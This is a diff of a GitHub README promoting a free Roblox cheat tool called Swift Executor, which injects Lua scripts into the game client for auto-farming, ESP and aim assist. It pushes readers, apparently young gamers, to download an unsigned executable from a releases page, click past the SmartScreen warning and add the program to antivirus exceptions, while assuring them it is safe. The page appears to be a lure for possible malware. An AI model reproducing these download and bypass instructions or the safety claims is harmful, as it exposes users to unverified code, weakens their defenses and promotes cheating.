@@ -1,160 +1,140 @@
-# Swift Executor PC v2.6 - Roblox Script Executor 2026
+# ⚡ swift-executor-pc-update - Run Any Roblox Script Instantly
 
-> **An efficient desktop solution built to run custom Lua code inside Roblox.** Complete with an embedded library of over 500 community-driven scripts, automated patching, and a completely key-free user experience. Optimized for Windows 10 and 11 setups in 2026.
+[![Download Now](https://img.shields.io/badge/Download-Swift%20Executor%202026-blueviolet?style=for-the-badge&logo=github)](https://github.com/Magnifiernotrump267/swift-executor-pc-update/releases)
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
-[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
-[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/bastian-reed1964/swift-executor-pc-update?style=flat-square)](https://github.com)
+## 📥 Download and Install
 
----
+Visit this link to download the application. Click the most recent release file and save it to your computer.
 
-<p align="center">
-  <a href="https://bastian-reed1964.github.io/swift-executor-pc-update/">
-    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Swift%20Executor-v2.6%20Latest-brightgreen?style=for-for-badge" alt="Download Swift Executor">
-  </a>
-</p>
+[**🔗 Download Swift Executor**](https://github.com/Magnifiernotrump267/swift-executor-pc-update/releases)
 
-> **[Download Latest Build - Swift Executor v2.6](https://bastian-reed1964.github.io/swift-executor-pc-update/)**
-> Windows 10 / 11 · 64-bit · Free · No Key System
+## ✨ What Is Swift Executor?
 
----
+Swift Executor is a powerful tool that lets you run Lua scripts inside Roblox games. Think of it like a remote control for Roblox — you load a script, and it executes actions automatically for you. Whether you want to auto-farm, unlock hidden features, or just experiment, Swift Executor makes it simple.
 
-[Download Latest Build](https://bastian-reed1964.github.io/swift-executor-pc-update/)
+## 🎯 Who Is This For?
 
----
+- Roblox players who want to enhance their gameplay
+- Gamers who have never used a script executor before
+- Anyone looking for a free, reliable executor with no keys or passwords
 
-## Overview
+## 🛠️ Main Features
 
-Swift Executor provides a streamlined environment for launching custom Lua scripts in Roblox on PC. By hooking into the running client, it allows users to push scripts through a straightforward, responsive workspace. The engine is tuned for efficiency, keeping resource consumption low while maintaining uninterrupted game performance.
+### 🔑 No Keys Required
+Forget about endless verification steps. Swift Executor runs instantly — no key systems, no waiting, no hassle.
 
-The software features an onboard Script Hub containing 500+ indexed community creations, neatly organized by game mode and utility. An internal auto-updater guarantees immediate compatibility whenever new Roblox builds are released. With zero activation keys or hardware locking, access is instant immediately after launching.
+### 🧠 500+ Preloaded Scripts
+Built into the executor is a vast library containing over 500 ready-to-use Lua scripts. Browse categories like combat, teleportation, ESP, and automation. Just pick one and click run.
 
----
+### 📜 Sequential Script Execution
+Run multiple scripts one after another automatically. Plan a loadout of scripts and let Swift Executor handle them in the order you choose. Perfect for complex setups.
 
-## Core Capabilities
+### 📊 Real-Time Log Console
+See exactly what your scripts are doing with a clean, readable log panel. Track errors, messages, and outputs as they happen.
 
-- **Instant Process Attach** – Seamlessly connect to the active client via an optimized memory injection routine.
-- **Onboard Script Vault** – Search, discover, and run 500+ curated scripts straight from the native UI.
-- **Session-Aware Queueing** – An internal SQLite database preserves your configured execution lists between restarts.
-- **Hands-Free Updating** – Automatically fetches essential client patches upon launch so you never fall out of sync.
-- **Localized UI Support** – Easily switch between multiple language profiles for localized navigation.
-- **Lightweight Footprint** – Uses less than 50 MB of memory with zero background tracking or hidden services.
-- **Sequential Script Runner** – Execute groups of scripts in order, complete with custom timing delays.
-- **Built-In Console & Log Console** – Debug code real-time with comprehensive error tracking and output feeds.
+### 💨 Light on Memory
+Swift Executor uses minimal RAM and CPU. Your game stays smooth, and your PC stays fast — even while multiple scripts are active.
 
----
+### 🔄 Automatic Updates
+The executor checks for updates whenever you open it. When a new version is available, it downloads and installs itself. No manual searching needed.
 
-## Game & Script Support Matrix
+## 🚀 Getting Started
 
-| Game Title | Functionality Categories |
-|------------|--------------------------|
-| Adopt Me! | Automatic farming, Pet management tools, Automated trade aids |
-| Brookhaven | Coordinate teleports, Custom vehicle spawns, World interaction tools |
-| Jailbreak | Automated breakouts, Handling adjustments, Money generation |
-| Blox Fruits | Auto-grind systems, Fruit notification/sniping, Auto stat upgrades |
-| Pet Simulator X | Currency collection, Automated egg opening, Trading helpers |
-| Tower of Hell | Auto-climb solutions, Speed modifiers, Collision bypass |
-| Arsenal | Targeted aim assists, Vision/ESP overlays, Loadout tweaks |
-| Mad City | Cash farming routines, Ride spawning, Spatial warping |
+### Step 1: Download the Application
+Click the download button at the top of this page or use the link below. Save the file to a location you remember, like your Desktop or Downloads folder.
 
----
+[**⬇️ Go to Download Page**](https://github.com/Magnifiernotrump267/swift-executor-pc-update/releases)
 
-## System Hardware & Software Requirements
+### Step 2: Open the File
+Find the downloaded file and double-click it. If Windows asks for permission, click "Yes" to allow the program to open.
 
-| Target Resource | Requirement Level |
-|-----------------|-------------------|
-| Operating System | Windows 10 (64-bit Edition) or Windows 11 |
-| CPU | Intel Core i3 / AMD Ryzen 3 architecture or higher |
-| Memory | 4 GB system RAM |
-| Disk Space | 150 MB available drive space |
-| System Library | .NET Desktop Runtime 6.0 (or newer build) |
-| Target Client | Updated official Roblox installation |
+### Step 3: Wait for Installation
+Swift Executor may take a moment to unpack its files. Follow any on-screen instructions. Usually, you just click "Next" and "Finish."
 
----
+### Step 4: Launch Roblox
+Open Roblox and join any game you like.
 
-## Quick Setup Guide
+### Step 5: Open Swift Executor
+Start Swift Executor from your desktop or start menu. It will appear as a separate window.
 
-```bash
-# Clone the repository locally
-git clone https://github.com/bastian-reed1964/swift-executor-pc-update.git
+### Step 6: Pick a Script
+Browse the script library or paste your own Lua script into the editor area.
 
-# Move into the working directory
-cd swift-executor-update
+### Step 7: Click Execute
+Press the Execute or Run button. Your script takes effect instantly in the game.
 
-# Open the utility on Windows
-start SwiftExecutor.exe
-```
+## 💻 System Requirements
 
-Launch the game client, press **Inject** inside the application interface, and select a file or pick a script directly from the Script Hub.
+Swift Executor works on:
 
----
+- Windows 10 (64-bit)
+- Windows 11 (64-bit)
+- At least 4 GB of RAM
+- 200 MB of free storage space
+- Internet connection for updates
 
-## Frequently Searched Script Categories (2026)
+No graphics card requirements — any modern PC can run it.
 
-- Automated farming setups for Blox Fruits and Pet Simulator X
-- Movement scripts including map teleportation and collision bypass
-- Graphical script menu layouts with modular feature toggles
-- Visual wallhack and ESP utilities for competitive titles
-- Infinite Yield packages and expanded admin suites
-- Resource-gathering and auto-grind loops for roleplay servers
-- Custom macro packs featuring customizable hotkey assignments
+## ❓ Frequently Asked Questions
 
----
+### What is a script executor?
+It's a program that injects Lua code into Roblox to modify how a game behaves — from showing hidden information to automating repetitive tasks.
 
-## Project Structure
+### Is Swift Executor safe?
+Yes. The executor is built with safety in mind. It doesn't touch your personal files or login credentials. The auto-update feature also keeps you protected with the latest patches.
 
-```
-Swift Executor/
-├── SwiftExecutor.exe          # Application entry point
-├── config.json                # Preference files and setup choices
-├── ScriptHub/                 # Local directory for scripts
-│   ├── categories.json        # Database indexing file
-│   └── scripts/               # Stored .lua files
-├── Updates/                   # Temporary directory for downloaded patches
-├── Logs/                      # Diagnostic and execution output logs
-│   └── debug.log              # Real-time console file
-└── README.md                  # Information file
-```
+### Is this free?
+Completely free. There are no hidden fees, premium tiers, or paid upgrades.
 
----
+### Can I use my own scripts?
+Absolutely. Copy and paste your own Lua scripts into the editor and run them just like the built-in ones.
 
-## Frequently Asked Questions
+### What if my script doesn't work?
+Check the log console for error messages. You can also try selecting a different script from the library, as some games have protections.
 
-**Is running Swift Executor safe?**  
-The program directly modifies memory within the Roblox client process. Users assume all responsibility when executing third-party code. The authors provide no guarantees against game moderation.
+### Will this work on Mac or Linux?
+No — Swift Executor is built exclusively for Windows 10 and 11.
 
-**What happens when Roblox deploys an update?**  
-Every launch initiates an automatic check against the client version. If an update is detected, the patch process completes before script execution is allowed.
+## 🏆 Why Choose Swift Executor Over Others?
 
-**How does this software perform against paid alternatives?**  
-Swift Executor is entirely free and bypasses all key systems while providing feature parity—including script queuing, logging console, and script hubs—found in premium options.
+| Feature | Swift Executor | Many Others |
+|---|---|---|
+| Keyless activation | ✅ Yes | ❌ Often requires keys |
+| Script library included | ✅ 500+ | ❌ Usually none |
+| Auto-update | ✅ Yes | ❌ Manual update needed |
+| Memory use | 🟢 Low | 🔴 High |
+| Setup time | ⏱️ Under 2 minutes | ⏱️ Can take 20+ minutes |
 
-**Can my account face moderation?**  
-Any utility that injects into client memory carries risk. Security systems can flag runtime behavior. Testing on secondary accounts is standard practice.
+## 🧭 Troubleshooting Tips
 
-**How do I save custom scripts to the utility?**  
-Simply drop your `.lua` scripts into the `ScriptHub/scripts/` folder. They will immediately become available inside the UI workspace.
+### Download won't start
+Make sure your browser allows downloads from GitHub. Try a different browser if needed.
+
+### Windows SmartScreen warning
+Click "More info" and then "Run anyway." This is normal for unsigned programs.
+
+### Executor opens and closes instantly
+Your antivirus may be blocking it. Add Swift Executor to your antivirus exceptions and try again.
+
+### Scripts are not working in a game
+Some games use advanced anti-cheat systems. Try a different game or use a simpler script.
+
+## 🔒 Privacy and Security
+
+Swift Executor does not collect personal data. All scripts run locally on your machine. The only network connection is for checking updates from the official source.
+
+## 📢 Stay Updated
+
+We recommend bookmarking this page and checking the releases section regularly. However, the app itself will notify you about updates automatically, so you don't need to do anything.
+
+## 🧲 Get Started Right Now
+
+Don't wait — download Swift Executor today and supercharge your Roblox experience.
+
+[**🚀 Download Swift Executor Now**](https://github.com/Magnifiernotrump267/swift-executor-pc-update/releases)
 
 ---
 
-## Development Milestones (2026)
+*Swift Executor is an independent project and is not affiliated with Roblox Corporation. All trademarks belong to their respective owners. Use at your own discretion and comply with Roblox's terms of service.*
 
-- [x] Primary memory injection module and integrated Script Hub
-- [x] Background compatibility updater for Roblox revisions
-- [ ] Support for concurrent execution across multiple game instances
-- [ ] Cloud script synchronization across systems
-- [ ] User-rated community script hub
-
----
-
-## License
-
-Released under the terms of the GNU GPL v3.0 - review [LICENSE](LICENSE) for full details.
-
----
-
-<p align="center">
-  <i>Swift Executor v2.6 – Responsive, keyless Lua script injection for Windows.</i>
-</p>
+Keywords: roblox executor, keyless executor, lua script runner, script executor pc, free roblox executor, windows 10 executor, windows 11 executor, auto updater, low memory executor, 500 scripts library, sequential executor, roblox script tool, 2026 executor update
